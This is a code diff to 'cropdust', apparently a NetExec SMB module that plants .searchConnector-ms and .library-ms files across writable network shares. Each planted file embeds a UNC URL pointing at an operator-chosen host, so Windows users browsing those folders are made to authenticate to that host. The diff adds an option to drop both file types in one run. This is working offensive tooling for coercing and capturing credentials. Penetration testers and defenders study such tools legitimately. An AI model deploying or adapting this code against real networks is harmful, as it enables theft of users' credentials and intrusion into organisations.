@@ -72,36 +72,33 @@ class CropDuster:
             all_dirs.append(dir_path)
 
         for dir in all_dirs:
-            # drop or clean
-            extension = ".searchConnector-ms" if self.type == "search" else ".library-ms"
-            file_name = self.filename + extension
-            remote_path = ntpath.join(dir, file_name)
-            self.logger.display(f'{remote_path}')
-            try:
-                if self.cleanup:
-                    self.smb.conn.deleteFile(self.share, remote_path)
-                    self.logger.success(f"Cleaned: {self.share}{remote_path}")
-                    self.log_to_file("CLEAN", remote_path)
-                else:
-                    with open(self.scfile_path, "rb") as scfile:
-                        self.smb.conn.putFile(self.share, remote_path, scfile.read)
-                        self.logger.success(f"Dropped: {self.share}{remote_path}")
-                        self.log_to_file("DROP", remote_path)
-            except Exception as e:
-                if "0xc0000022 - STATUS_ACCESS_DENIED" in str(e):
-                    self.logger.fail(f"{dir} not writable, skipping")
-                    pass
-                elif "0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND" in str(e):
-                    self.logger.fail(f"{file_name} not found in {dir}, skipping")
-                    pass
-                else:
-                    self.logger.fail(f"Error in {dir}: {e}")
+            for local_path in self.scfile_path:
+                file_name = ntpath.basename(local_path)
+                remote_path = ntpath.join(dir, file_name)
+                self.logger.display(f'{remote_path}')
+                try:
+                    if self.cleanup:
+                        self.smb.conn.deleteFile(self.share, remote_path)
+                        self.logger.success(f"Cleaned: {self.share}{remote_path}")
+                        self.log_to_file("CLEAN", remote_path)
+                    else:
+                        with open(local_path, "rb") as scfile:
+                            self.smb.conn.putFile(self.share, remote_path, scfile.read)
+                            self.logger.success(f"Dropped: {self.share}{remote_path}")
+                            self.log_to_file("DROP", remote_path)
+                except Exception as e:
+                    if "0xc0000022 - STATUS_ACCESS_DENIED" in str(e):
+                        self.logger.fail(f"{dir} not writable, skipping")
+                    elif "0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND" in str(e):
+                        self.logger.fail(f"{file_name} not found in {dir}, skipping")
+                    else:
+                        self.logger.fail(f"Error in {dir}: {e}")
 
 
 class NXCModule:
 
     name = "cropdust"
-    description = "Recursively or selectively drop a .searchConnector-ms/.library-ms file into folder(s) on writable shares. Has a cleanup function"
+    description = "Recursively or selectively drop a .searchConnector-ms/.library-ms file into folder(s) on writable shares. Has a log and cleanup function"
     supported_protocols = ["smb"]
     opsec_safe = False
     multiple_hosts = False
@@ -116,7 +113,7 @@ class NXCModule:
         URL                 URL in the dropped file to call back to, format is {HOST}@{PORT} - default is "microsoft.com@80"
         FOLDER              Specify a specific folder to write to - default is recursive
         FILENAME            Specify the filename used WITHOUT extension - default is "Documents"
-        TYPE                Specify type of file to drop (search/library) - default is "search"
+        TYPE                Specify type of file to drop (search/library/both) - default is "search"
         CLEANUP             Clean up dropped files - default is False
         """
         
@@ -149,15 +146,16 @@ class NXCModule:
             self.folders = str(module_options["FOLDER"])
         
         # type
+        self.scfile_path = []
         self.type = "search"
         if "TYPE" in module_options:
             self.type = str(module_options["TYPE"])
-        if self.type == "search":
-            self.scfile_path = f"{self.filename}.searchConnector-ms"
-            # if we aren't doing cleanup, create a local search connector file in temp directory
+
+        if self.type in ("search", "both"):
+            path = f"{self.filename}.searchConnector-ms"
             if not self.cleanup:
-                self.scfile_path = f"{tempfile.gettempdir()}/{self.filename}.searchConnector-ms"
-                with open(self.scfile_path, "w") as scfile:
+                path = f"{tempfile.gettempdir()}/{self.filename}.searchConnector-ms"
+                with open(path, "w") as scfile:
                     scfile.truncate(0)
                     scfile.write('<?xml version="1.0" encoding="UTF-8"?>')
                     scfile.write('<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">')
@@ -172,12 +170,13 @@ class NXCModule:
                     scfile.write(f"<url>\\\\{self.url}\\SearchOutlook</url>")
                     scfile.write("</simpleLocation>")
                     scfile.write("</searchConnectorDescription>")
-        elif self.type == "library":
-            self.scfile_path = f"{self.filename}.library-ms"
-            # if we aren't doing cleanup, create a local search connector file in temp directory
+            self.scfile_path.append(path)
+
+        if self.type in ("library", "both"):
+            path = f"{self.filename}.library-ms"
             if not self.cleanup:
-                self.scfile_path = f"{tempfile.gettempdir()}/{self.filename}.library-ms"
-                with open(self.scfile_path, "w") as scfile:
+                path = f"{tempfile.gettempdir()}/{self.filename}.library-ms"
+                with open(path, "w") as scfile:
                     scfile.truncate(0)
                     scfile.write('<?xml version="1.0" encoding="UTF-8"?>')
                     scfile.write('<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">')
@@ -190,7 +189,7 @@ class NXCModule:
                     scfile.write("</templateInfo>")
                     scfile.write("<searchConnectorDescriptionList>")
                     scfile.write('<searchConnectorDescription>')
-                    scfile.write(f"<isDefaultSaveLocation>true</isDefaultSaveLocation>")
+                    scfile.write("<isDefaultSaveLocation>true</isDefaultSaveLocation>")
                     scfile.write("<isSupported>false</isSupported>")
                     scfile.write("<simpleLocation>")
                     scfile.write(f"<url>\\\\{self.url}\\LibMicrosoft</url>")
@@ -198,6 +197,7 @@ class NXCModule:
                     scfile.write('</searchConnectorDescription>')
                     scfile.write('</searchConnectorDescriptionList>')
                     scfile.write('</libraryDescription>')
+            self.scfile_path.append(path)
 
 
     def on_login(self, context, connection):
